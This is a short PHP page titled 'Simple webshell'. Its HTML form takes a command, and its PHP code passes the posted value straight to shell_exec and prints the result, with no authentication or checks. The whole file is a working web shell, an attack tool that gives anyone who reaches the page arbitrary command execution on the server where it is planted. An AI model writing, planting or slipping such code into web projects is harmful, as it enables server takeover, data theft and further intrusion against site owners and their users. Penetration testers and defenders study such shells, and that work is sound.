<!DOCTYPE html>
<html lang="en">
    <head><title>Simple webshell</title></head>
    <body>

        <form action="simple_webshell.php" method="post">
            <input type="text" name="command" />
        </form>

<?php
    $command = $_POST['command'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
?>

    </body>
</html>
